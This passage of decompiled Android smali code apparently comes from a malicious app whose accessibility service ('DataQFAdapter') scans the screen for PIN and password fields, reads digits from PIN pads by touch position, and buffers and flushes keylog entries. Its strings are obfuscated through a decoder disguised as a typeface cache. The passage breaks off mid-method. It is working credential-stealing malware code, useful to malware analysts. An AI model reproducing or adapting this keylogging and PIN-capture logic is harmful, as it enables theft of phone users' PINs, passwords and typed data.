    if-lez v9, :cond_a

    .line 149
    .line 150
    invoke-direct {p0, v8}, Lapp/mobilex/plus/services/DataQFAdapter;->findDigitInChildren(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    .line 151
    .line 152
    .line 153
    move-result-object v9

    .line 154
    invoke-virtual {v9}, Ljava/lang/String;->length()I

    .line 155
    .line 156
    .line 157
    move-result v10

    .line 158
    if-ne v10, v11, :cond_a

    .line 159
    .line 160
    invoke-virtual {v9, v4}, Ljava/lang/String;->charAt(I)C

    .line 161
    .line 162
    .line 163
    move-result v10

    .line 164
    invoke-static {v10}, Ljava/lang/Character;->isDigit(C)Z

    .line 165
    .line 166
    .line 167
    move-result v10

    .line 168
    if-eqz v10, :cond_a

    .line 169
    .line 170
    new-instance v10, Landroid/graphics/Rect;

    .line 171
    .line 172
    invoke-direct {v10}, Landroid/graphics/Rect;-><init>()V

    .line 173
    .line 174
    .line 175
    invoke-virtual {v8, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    .line 176
    .line 177
    .line 178
    invoke-virtual {v10, p1, v2}, Landroid/graphics/Rect;->contains(II)Z

    .line 179
    .line 180
    .line 181
    move-result v11
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 182
    if-eqz v11, :cond_9

    .line 183
    .line 184
    :try_start_6
    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_3

    .line 185
    .line 186
    .line 187
    :catchall_3
    :try_start_7
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_4

    .line 188
    .line 189
    .line 190
    :catchall_4
    return-object v9

    .line 191
    :cond_9
    :try_start_8
    invoke-virtual {v10}, Landroid/graphics/Rect;->centerX()I

    .line 192
    .line 193
    .line 194
    move-result v11

    .line 195
    sub-int/2addr v11, p1

    .line 196
    invoke-virtual {v10}, Landroid/graphics/Rect;->centerY()I

    .line 197
    .line 198
    .line 199
    move-result v10
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    .line 200
    sub-int/2addr v10, v2

    .line 201
    mul-int/2addr v11, v11

    .line 202
    mul-int/2addr v10, v10

    .line 203
    add-int/2addr v10, v11

    .line 204
    if-ge v10, v5, :cond_a

    .line 205
    .line 206
    move-object/from16 v7, v9

    .line 207
    move v5, v10

    .line 208
    :cond_a
    :try_start_9
    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_5

    .line 209
    .line 210
    .line 211
    :catchall_5
    :goto_2
    add-int/lit8 v6, v6, 0x1

    .line 212
    .line 213
    goto/16 :goto_0

    .line 214
    .line 215
    :goto_3
    :try_start_a
    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_6

    .line 216
    .line 217
    .line 218
    :catchall_6
    :try_start_b
    throw p1

    .line 219
    :catchall_7
    move-exception p1

    .line 220
    goto :goto_5

    .line 221
    :cond_b
    invoke-interface {v7}, Ljava/lang/CharSequence;->length()I

    .line 222
    .line 223
    .line 224
    move-result p1
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_7

    .line 225
    if-lez p1, :cond_c

    .line 226
    .line 227
    const/16 p1, 0x2710

    .line 228
    .line 229
    if-ge v5, p1, :cond_c

    .line 230
    .line 231
    :try_start_c
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_8

    .line 232
    .line 233
    .line 234
    :catchall_8
    return-object v7

    nop

    .line 235
    :cond_c
    :goto_4
    :try_start_d
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_a

    .line 236
    .line 237
    .line 238
    goto/16 :goto_6

    .line 239
    :catchall_9
    move-exception p1

    .line 240
    const/4 v1, 0x0

    .line 241
    :goto_5
    :try_start_e
    const-string v2, "0025007F0055008300D400B600D500AE003700570056008800FE00B800E100AE0021007A0052008900F700AC009200A2003100640054009500AA00FF"

    .line 242
    .line 243
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 244
    .line 245
    .line 246
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;
    :try_end_e
    .catchall {:try_start_e .. :try_end_e} :catchall_b

    .line 247
    .line 248
    .line 249
    if-eqz v1, :cond_d

    nop

    nop

    .line 250
    .line 251
    goto :goto_4

    .line 252
    :catchall_a
    :cond_d
    :goto_6
    return-object v0

    .line 253
    :catchall_b
    move-exception p1

    .line 254
    if-eqz v1, :cond_e

    .line 255
    .line 256
    :try_start_f
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_f
    .catchall {:try_start_f .. :try_end_f} :catchall_c

    .line 257
    .line 258
    .line 259
    :catchall_c
    :cond_e
    throw p1

    nop
.end method

.method private final findDigitByBounds(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;
    .locals 12

    .line 1
    const-string v0, ""

    .line 2
    .line 3
    :try_start_0
    new-instance v1, Landroid/graphics/Rect;

    .line 4
    .line 5
    invoke-direct {v1}, Landroid/graphics/Rect;-><init>()V

    .line 6
    .line 7
    .line 8
    invoke-virtual {p1, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    .line 9
    .line 10
    .line 11
    invoke-virtual {v1}, Landroid/graphics/Rect;->centerX()I

    .line 12
    .line 13
    .line 14
    move-result p1

    .line 15
    invoke-virtual {v1}, Landroid/graphics/Rect;->centerY()I

    .line 16
    .line 17
    .line 18
    move-result v2

    .line 19
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 20
    .line 21
    .line 22
    move-result-object v3
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_5

    .line 23
    if-nez v3, :cond_0

    .line 24
    .line 25
    return-object v0

    .line 26
    :cond_0
    :try_start_1
    new-instance v4, Ljava/util/ArrayList;

    .line 27
    .line 28
    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V

    .line 29
    .line 30
    .line 31
    const/16 v5, 0x0

    .line 32
    invoke-direct {p0, v3, v4, v5}, Lapp/mobilex/plus/services/DataQFAdapter;->collectDigitNodes(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/List;I)V

    .line 33
    .line 34
    .line 35
    invoke-interface {v4}, Ljava/util/List;->size()I

    .line 36
    .line 37
    .line 38
    move-result v6
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_2

    .line 39
    const/16 v7, 0x42

    add-int/lit8 v7, v7, -0x3f

    .line 40
    if-ge v6, v7, :cond_1

    .line 41
    .line 42
    :try_start_2
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 43
    .line 44
    .line 45
    :catchall_0
    return-object v0

    .line 46
    :cond_1
    :try_start_3
    invoke-virtual {v4}, Ljava/util/ArrayList;->size()I

    .line 47
    .line 48
    .line 49
    move-result v6

    .line 50
    const v7, 0x7fffffff

    .line 51
    .line 52
    .line 53
    move-object/from16 v8, v0

    .line 54
    :cond_2
    :goto_0
    if-ge v5, v6, :cond_4

    .line 55
    .line 56
    invoke-virtual {v4, v5}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    .line 57
    .line 58
    .line 59
    move-result-object v9

    .line 60
    add-int/lit8 v5, v5, 0x1

    .line 61
    .line 62
    check-cast v9, Lv/s/yI1KTRoNlsjx;

    .line 63
    .line 64
    iget-object v10, v9, Lv/s/yI1KTRoNlsjx;->w9sT1Swbhx3hs:Ljava/lang/Object;

    nop

    .line 65
    .line 66
    check-cast v10, Ljava/lang/String;

    .line 67
    .line 68
    iget-object v9, v9, Lv/s/yI1KTRoNlsjx;->vekpFI4d1Nc4fakF:Ljava/lang/Object;

    nop

    .line 69
    .line 70
    check-cast v9, Landroid/graphics/Rect;

    nop

    nop

    .line 71
    .line 72
    invoke-virtual {v9, p1, v2}, Landroid/graphics/Rect;->contains(II)Z

    .line 73
    .line 74
    .line 75
    move-result v11
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_2

    .line 76
    if-eqz v11, :cond_3

    .line 77
    .line 78
    :try_start_4
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    .line 79
    .line 80
    .line 81
    :catchall_1
    return-object v10

    .line 82
    :cond_3
    :try_start_5
    invoke-virtual {v9}, Landroid/graphics/Rect;->centerX()I

    .line 83
    .line 84
    .line 85
    move-result v11

    .line 86
    sub-int/2addr v11, p1

    .line 87
    invoke-virtual {v9}, Landroid/graphics/Rect;->centerY()I

    .line 88
    .line 89
    .line 90
    move-result v9

    .line 91
    sub-int/2addr v9, v2

    .line 92
    mul-int/2addr v11, v11

    .line 93
    mul-int/2addr v9, v9

    .line 94
    add-int/2addr v9, v11

    .line 95
    if-ge v9, v7, :cond_2

    .line 96
    .line 97
    move v7, v9

    .line 98
    move-object v8, v10

    .line 99
    goto :goto_0

    .line 100
    :catchall_2
    move-exception p1

    .line 101
    goto :goto_1

    .line 102
    :cond_4
    invoke-virtual {v1}, Landroid/graphics/Rect;->width()I

    .line 103
    .line 104
    .line 105
    move-result p1

    .line 106
    invoke-virtual {v1}, Landroid/graphics/Rect;->width()I

    .line 107
    .line 108
    .line 109
    move-result v1

    .line 110
    mul-int/2addr p1, v1

    .line 111
    invoke-interface {v8}, Ljava/lang/CharSequence;->length()I

    .line 112
    .line 113
    .line 114
    move-result v1

    nop
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    .line 115
    if-lez v1, :cond_5

    .line 116
    .line 117
    mul-int/lit8 p1, p1, 0x4

    .line 118
    .line 119
    if-ge v7, p1, :cond_5

    .line 120
    .line 121
    :try_start_6
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_3

    .line 122
    .line 123
    .line 124
    :catchall_3
    return-object v8

    nop

    .line 125
    :cond_5
    :try_start_7
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_6

    .line 126
    .line 127
    .line 128
    goto :goto_2

    .line 129
    :goto_1
    :try_start_8
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_4

    .line 130
    .line 131
    .line 132
    :catchall_4
    :try_start_9
    throw p1
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_5

    .line 133
    :catchall_5
    move-exception p1

    .line 134
    const-string v1, "0025007F0055008300D400B600D500AE00370054004200A500FF00AA00DC00A300300036005E009500E200B000C000FD0063"

    .line 135
    .line 136
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 137
    .line 138
    .line 139
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 140
    .line 141
    .line 142
    :catchall_6
    :goto_2
    return-object v0
.end method

.method private final findDigitInChildren(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;
    .locals 8

    .line 1
    const-string v0, ""

    .line 2
    .line 3
    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    .line 4
    .line 5
    .line 6
    move-result v1

    .line 7
    const/16 v2, 0x0

    .line 8
    move v3, v2

    nop

    nop

    .line 9
    :goto_0
    if-ge v3, v1, :cond_8

    .line 10
    .line 11
    invoke-virtual {p1, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 12
    .line 13
    .line 14
    move-result-object v4
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_5

    .line 15
    if-nez v4, :cond_0

    .line 16
    .line 17
    goto/16 :goto_2

    .line 18
    :cond_0
    :try_start_1
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 19
    .line 20
    .line 21
    move-result-object v5

    .line 22
    if-eqz v5, :cond_1

    .line 23
    .line 24
    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 25
    .line 26
    .line 27
    move-result-object v5

    nop

    .line 28
    if-nez v5, :cond_2

    .line 29
    .line 30
    goto/16 :goto_1

    .line 31
    :catchall_0
    move-exception p1

    .line 32
    goto/16 :goto_3

    .line 33
    :cond_1
    :goto_1
    move-object v5, v0

    .line 34
    :cond_2
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    .line 35
    .line 36
    .line 37
    move-result-object v6

    .line 38
    if-eqz v6, :cond_3

    .line 39
    .line 40
    invoke-virtual {v6}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 41
    .line 42
    .line 43
    move-result-object v6

    .line 44
    if-nez v6, :cond_4

    .line 45
    .line 46
    :cond_3
    move-object v6, v0

    nop

    nop

    .line 47
    :cond_4
    invoke-interface {v5}, Ljava/lang/CharSequence;->length()I

    .line 48
    .line 49
    .line 50
    move-result v7

    .line 51
    if-nez v7, :cond_5

    .line 52
    .line 53
    move-object v5, v6

    .line 54
    :cond_5
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    .line 55
    .line 56
    .line 57
    move-result v6

    .line 58
    const/16 v7, 0x1

    nop

    .line 59
    if-ne v6, v7, :cond_6

    .line 60
    .line 61
    invoke-virtual {v5, v2}, Ljava/lang/String;->charAt(I)C

    .line 62
    .line 63
    .line 64
    move-result v6

    .line 65
    invoke-static {v6}, Ljava/lang/Character;->isDigit(C)Z

    .line 66
    .line 67
    .line 68
    move-result v6
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 69
    if-eqz v6, :cond_6

    .line 70
    .line 71
    :try_start_2
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    .line 72
    .line 73
    .line 74
    :catchall_1
    return-object v5

    .line 75
    :cond_6
    :try_start_3
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    .line 76
    .line 77
    .line 78
    move-result v5

    nop

    .line 79
    if-lez v5, :cond_7

    nop

    nop

    .line 80
    .line 81
    invoke-direct {p0, v4}, Lapp/mobilex/plus/services/DataQFAdapter;->findDigitInChildren(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    .line 82
    .line 83
    .line 84
    move-result-object v5

    .line 85
    invoke-interface {v5}, Ljava/lang/CharSequence;->length()I

    .line 86
    .line 87
    .line 88
    move-result v6
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 89
    if-lez v6, :cond_7

    .line 90
    .line 91
    :try_start_4
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    .line 92
    .line 93
    .line 94
    :catchall_2
    return-object v5

    nop

    .line 95
    :cond_7
    :try_start_5
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_3

    .line 96
    .line 97
    .line 98
    :catchall_3
    :goto_2
    add-int/lit8 v3, v3, 0x1

    .line 99
    .line 100
    goto :goto_0

    .line 101
    :goto_3
    :try_start_6
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_4

    .line 102
    .line 103
    .line 104
    :catchall_4
    :try_start_7
    throw p1
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_5

    .line 105
    :catchall_5
    :cond_8
    return-object v0
.end method

.method private final findFocusedEditText(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 4

    .line 1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isFocused()Z

    .line 2
    .line 3
    .line 4
    move-result v0

    .line 5
    if-eqz v0, :cond_0

    .line 6
    .line 7
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    .line 8
    .line 9
    .line 10
    move-result v0

    .line 11
    if-eqz v0, :cond_0

    .line 12
    .line 13
    return-object p1

    .line 14
    :cond_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    .line 15
    .line 16
    .line 17
    move-result v0

    .line 18
    const/4 v1, 0x0

    .line 19
    :goto_0
    if-ge v1, v0, :cond_3

    .line 20
    .line 21
    invoke-virtual {p1, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 22
    .line 23
    .line 24
    move-result-object v2

    .line 25
    if-nez v2, :cond_1

    .line 26
    .line 27
    goto :goto_1

    .line 28
    :cond_1
    invoke-direct {p0, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->findFocusedEditText(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 29
    .line 30
    .line 31
    move-result-object v3

    .line 32
    if-eqz v3, :cond_2

    .line 33
    .line 34
    return-object v3

    .line 35
    :cond_2
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 36
    .line 37
    .line 38
    :goto_1
    add-int/lit8 v1, v1, 0x1

    .line 39
    .line 40
    goto/16 :goto_0

    nop

    nop

    .line 41
    :cond_3
    const/4 p1, 0x0

    .line 42
    return-object p1

    nop

    nop
.end method

.method private final findPinField(Landroid/view/accessibility/AccessibilityNodeInfo;I)Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 8

    .line 1
    const v0, 0xc

    .line 2
    .line 3
    const/16 v1, 0x0

    .line 4
    if-le p2, v0, :cond_0

    .line 5
    .line 6
    return-object v1

    .line 7
    :cond_0
    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    .line 8
    .line 9
    .line 10
    move-result-object v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_4

    .line 11
    const-string v2, ""

    .line 12
    .line 13
    if-nez v0, :cond_1

    nop

    nop

    .line 14
    .line 15
    move-object v0, v2

    .line 16
    :cond_1
    :try_start_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 17
    .line 18
    .line 19
    move-result-object v3

    .line 20
    if-eqz v3, :cond_3

    .line 21
    .line 22
    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 23
    .line 24
    .line 25
    move-result-object v3

    .line 26
    if-nez v3, :cond_2

    .line 27
    .line 28
    goto/16 :goto_0

    .line 29
    :cond_2
    move-object v2, v3

    .line 30
    :cond_3
    :goto_0
    const/16 v3, 0x0

    .line 31
    move/from16 v4, v3

    nop

    nop

    .line 32
    :goto_1
    invoke-interface {v2}, Ljava/lang/CharSequence;->length()I

    .line 33
    .line 34
    .line 35
    move-result v5

    .line 36
    const/16 v6, 0x1

    nop

    nop

    .line 37
    if-ge v4, v5, :cond_6

    nop

    .line 38
    .line 39
    invoke-interface {v2, v4}, Ljava/lang/CharSequence;->charAt(I)C

    .line 40
    .line 41
    .line 42
    move-result v5

    .line 43
    const/16 v7, 0x2022

    .line 44
    .line 45
    if-eq v5, v7, :cond_5

    .line 46
    .line 47
    const/16 v7, 0x2a

    .line 48
    .line 49
    if-eq v5, v7, :cond_5

    .line 50
    .line 51
    const/16 v7, 0x25cf

    .line 52
    .line 53
    if-eq v5, v7, :cond_5

    nop

    nop

    .line 54
    .line 55
    const v7, 0x2b24

    .line 56
    .line 57
    if-eq v5, v7, :cond_5

    .line 58
    .line 59
    const/16 v7, 0x25cb

    nop

    .line 60
    .line 61
    if-ne v5, v7, :cond_4

    .line 62
    .line 63
    goto/16 :goto_2

    nop

    .line 64
    :cond_4
    add-int/lit8 v4, v4, 0x1

    .line 65
    .line 66
    goto :goto_1

    .line 67
    :cond_5
    :goto_2
    move/from16 v4, v6

    .line 68
    goto :goto_3

    .line 69
    :cond_6
    move/from16 v4, v3

    .line 70
    :goto_3
    const-string v5, "0033007F0055"

    nop

    nop

    .line 71
    .line 72
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 73
    .line 74
    .line 75
    move-result-object v5

    .line 76
    invoke-static {v0, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 77
    .line 78
    .line 79
    move-result v5

    .line 80
    if-nez v5, :cond_8

    .line 81
    .line 82
    const-string v5, "003300770048009400F300B000D600A2"

    .line 83
    .line 84
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 85
    .line 86
    .line 87
    move-result-object v5

    .line 88
    invoke-static {v0, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 89
    .line 90
    .line 91
    move-result v5

    .line 92
    if-nez v5, :cond_8

    .line 93
    .line 94
    const-string v5, "002C0062004B"

    .line 95
    .line 96
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 97
    .line 98
    .line 99
    move-result-object v5

    nop

    nop

    .line 100
    invoke-static {v0, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 101
    .line 102
    .line 103
    move-result v0

    .line 104
    if-eqz v0, :cond_7

    .line 105
    .line 106
    goto :goto_4

    .line 107
    :cond_7
    move v0, v3

    .line 108
    goto :goto_5

    .line 109
    :cond_8
    :goto_4
    move/from16 v0, v6

    .line 110
    :goto_5
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isPassword()Z

    .line 111
    .line 112
    .line 113
    move-result v5

    .line 114
    if-nez v5, :cond_d

    .line 115
    .line 116
    if-eqz v4, :cond_9

    .line 117
    .line 118
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    .line 119
    .line 120
    .line 121
    move-result v2

    .line 122
    if-gt v6, v2, :cond_9

    .line 123
    .line 124
    const/16 v4, 0xd

    nop

    nop

    .line 125
    .line 126
    if-ge v2, v4, :cond_9

    .line 127
    .line 128
    goto/16 :goto_8

    .line 129
    :cond_9
    if-eqz v0, :cond_a

    .line 130
    .line 131
    goto :goto_8

    .line 132
    :cond_a
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    .line 133
    .line 134
    .line 135
    move-result v0

    nop

    .line 136
    :goto_6
    if-ge v3, v0, :cond_e

    .line 137
    .line 138
    invoke-virtual {p1, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 139
    .line 140
    .line 141
    move-result-object v2
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_4

    .line 142
    if-nez v2, :cond_b

    .line 143
    .line 144
    goto/16 :goto_7

    .line 145
    :cond_b
    add-int/lit8 v4, p2, 0x1

    .line 146
    .line 147
    :try_start_2
    invoke-direct {p0, v2, v4}, Lapp/mobilex/plus/services/DataQFAdapter;->findPinField(Landroid/view/accessibility/AccessibilityNodeInfo;I)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 148
    .line 149
    .line 150
    move-result-object v4
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    .line 151
    if-eqz v4, :cond_c

    .line 152
    .line 153
    :try_start_3
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 154
    .line 155
    .line 156
    :catchall_0
    return-object v4

    .line 157
    :cond_c
    :try_start_4
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    .line 158
    .line 159
    .line 160
    :catchall_1
    :goto_7
    add-int/lit8 v3, v3, 0x1

    .line 161
    .line 162
    goto/16 :goto_6

    .line 163
    :catchall_2
    move-exception p1

    .line 164
    :try_start_5
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_3

    .line 165
    .line 166
    .line 167
    :catchall_3
    :try_start_6
    throw p1

    .line 168
    :cond_d
    :goto_8
    invoke-static {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->obtain(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 169
    .line 170
    .line 171
    move-result-object p1
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_4

    .line 172
    return-object p1

    .line 173
    :catchall_4
    :cond_e
    return-object v1

    nop

    nop
.end method

.method private final flushAllPendingKeylogs()V
    .locals 4

    .line 1
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingKeylogEntries:Ljava/util/HashMap;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/util/HashMap;->keySet()Ljava/util/Set;

    .line 4
    .line 5
    .line 6
    move-result-object v0

    .line 7
    invoke-static {v0}, Lv/s/imhBI9RqzETHtVIJe;->dQC4QhgRN3MSEAP3HW0(Ljava/lang/Iterable;)Ljava/util/List;

    .line 8
    .line 9
    .line 10
    move-result-object v0

    .line 11
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    .line 12
    .line 13
    .line 14
    move-result-object v0

    .line 15
    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    .line 16
    .line 17
    .line 18
    move-result v1

    nop

    .line 19
    if-eqz v1, :cond_1

    .line 20
    .line 21
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 22
    .line 23
    .line 24
    move-result-object v1

    .line 25
    check-cast v1, Ljava/lang/String;

    .line 26
    .line 27
    iget-object v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingKeylogRunnables:Ljava/util/HashMap;

    .line 28
    .line 29
    invoke-virtual {v2, v1}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 30
    .line 31
    .line 32
    move-result-object v2

    .line 33
    check-cast v2, Ljava/lang/Runnable;

    .line 34
    .line 35
    if-eqz v2, :cond_0

    .line 36
    .line 37
    iget-object v3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->keylogDebounceHandler:Landroid/os/Handler;

    .line 38
    .line 39
    invoke-virtual {v3, v2}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 40
    .line 41
    .line 42
    :cond_0
    invoke-direct {p0, v1}, Lapp/mobilex/plus/services/DataQFAdapter;->flushFieldKeylog(Ljava/lang/String;)V

    .line 43
    .line 44
    .line 45
    goto :goto_0

    .line 46
    :cond_1
    return-void
.end method

.method private final flushFieldKeylog(Ljava/lang/String;)V
    .locals 5

    .line 1
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingKeylogEntries:Ljava/util/HashMap;

    nop

    nop

    .line 2
    .line 3
    invoke-virtual {v0, p1}, Ljava/util/HashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    .line 4
    .line 5
    .line 6
    move-result-object v0

    .line 7
    check-cast v0, Lv/s/NxAMaDFbSCxW6M03f;

    .line 8
    .line 9
    if-nez v0, :cond_0

    .line 10
    .line 11
    goto :goto_0

    .line 12
    :cond_0
    iget-object v1, v0, Lv/s/NxAMaDFbSCxW6M03f;->JXn4Qf7zpnLjP5:Ljava/lang/String;

    .line 13
    .line 14
    iget-object v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingKeylogData:Ljava/util/HashMap;

    .line 15
    .line 16
    invoke-virtual {v2, p1}, Ljava/util/HashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    .line 17
    .line 18
    .line 19
    move-result-object v2

    .line 20
    check-cast v2, Lv/s/meoyWy7uMVp1IjcAV;

    .line 21
    .line 22
    iget-object v3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingKeylogRunnables:Ljava/util/HashMap;

    .line 23
    .line 24
